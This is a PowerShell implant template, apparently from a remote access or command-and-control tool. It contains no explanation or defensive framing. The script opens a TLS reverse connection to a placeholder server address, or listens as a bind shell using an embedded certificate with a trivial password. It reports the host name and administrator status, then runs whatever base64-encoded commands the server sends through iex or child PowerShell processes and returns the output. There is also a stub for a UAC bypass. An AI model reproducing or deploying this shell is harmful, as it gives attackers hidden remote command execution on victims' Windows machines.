#$ErrorActionPreference = 'SilentlyContinue'
$byteAmount = New-Object Byte[] 10500
$Base64Cert = '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'
$CertPassword = 'password'
$isbind = $%s

Function Exec-Process ($execPath, $execArgs) {
	if ($execPath -eq 'powershell') {
		$execPath = (Get-Command powershell.exe).Definition
	}
  $pinfo = New-Object System.Diagnostics.ProcessStartInfo
  $pinfo.FileName = $execPath
  $pinfo.RedirectStandardError = $true
  $pinfo.RedirectStandardOutput = $true
  $pinfo.UseShellExecute = $false
  $pinfo.Arguments = $execArgs
  $p = New-Object System.Diagnostics.Process
  $p.StartInfo = $pinfo
	$p.Start() | Out-Null
  [pscustomobject]@{
    stdout = $p.StandardOutput.ReadToEnd()
    stderr = $p.StandardError.ReadToEnd()
    exitcode = $p.ExitCode
  }
  $p.WaitForExit()
}

Function Connect-Server ($ip, $port) {
	$connectionTrys = 10
	if (!$isbind) {
		while($connectionTrys -gt 0) {
			try{
				$Socket = New-Object System.Net.Sockets.TCPClient($ip,$port)
				if ($Socket.Connected) {
					break
				}
			} catch {
				$connectionTrys = $connectionTrys - 1
				Start-Sleep -s 1
			}
		}
	} else {
		$SSLcertfake = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2([System.Convert]::FromBase64String($Base64Cert), $CertPassword)
		$listener = [System.Net.Sockets.TcpListener][int]$port
		$listener.start()
		$Socket = $listener.AcceptTcpClient()
	}

	if ($Socket.Connected) {
		$sslSocket = New-Object System.Net.Security.SslStream $Socket.GetStream(), $false, ({$True} -as [Net.Security.RemoteCertificateValidationCallback])
		if (!$isbind)
		{
			$sslSocket.AuthenticateAsClient($env:computername)
		} else {
			$sslSocket.AuthenticateAsServer($SSLcertfake, $false, [System.Security.Authentication.SslProtocols]::Tls, $false)
		}



		if ((New-Object Security.Principal.WindowsPrincipal ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
			$isAdmin = "True"
		} else {
			$isAdmin = "False"
		}
		$userandPriv = "`0" + "`0" + "[#check#]" + $env:computername + ":" + $isAdmin
		$sendUserandPriv = ([text.encoding]::ASCII).GetBytes($userandPriv, 0, $userandPriv.Length)
		$sslSocket.Write($sendUserandPriv)
		$Connected = $True
	}
	else {
		$Connected = $False
	}
	[pscustomobject]@{
    Connected = $Connected
    Socket = $Socket
		Client = $sslSocket
  }
}


$Client = Connect-Server -ip '%s' -port '%s'

if ($Client.Connected) {
	while ($True) {

		$error.clear()
		$serverData = $Client.Client.Read($byteAmount, 0, $byteAmount.Length)
		$asciiData = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($byteAmount, 0, $serverData)
		try {
      $type = ($asciiData | ConvertFrom-Json).type
      $b64Data = ($asciiData | ConvertFrom-Json).data
      $sendoutput = ($asciiData | ConvertFrom-Json).sendoutput
      $multiple = ($asciiData | ConvertFrom-Json).multiple
      $data = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64Data))
      $extra = ($asciiData | ConvertFrom-Json).extra
		} catch {
			continue
		}

		if ($serverData -lt 1) {
			exit
		}

		if ($type -eq 'exec') {
			$sendtoServer = (iex -c $data 2>&1 | Out-String)
			if ($error[0]) {
				$sendtoServer = ($error[0] | Out-String)
			}
      if ($sendtoServer.Length -lt 1) {
        $sendtoServer = "`0"
      }
		}

    #if ($type -eq 'uacbypass') {


		#}

		if ($type -eq 'script') {
			$process = Exec-Process -execPath 'powershell' -execArgs ('-c ' + $data)
			if ($process.exitcode -eq 0) {
				$sendtoServer = $process.stdout
			}
			else {
				$sendtoServer = $process.stderr
			}
		}

		if ($multiple -eq 'true') {
			$multiplescript += $data
		}

		if ($multiple -eq 'exec') {
			Start-Process -NoNewWindow -FilePath powershell.exe -ArgumentList ('-c ' + $multiplescript) 2>&1 | Out-String
			$multiplescript = ""
		}

		if ($sendoutput -eq 'true') {
			$asciiBytes = ([text.encoding]::ASCII).GetBytes(' ' + $sendtoServer, 0, $sendtoServer.Length)
			$Client.Client.Write($asciiBytes)
			$Client.Client.Flush()
		}
	}
}
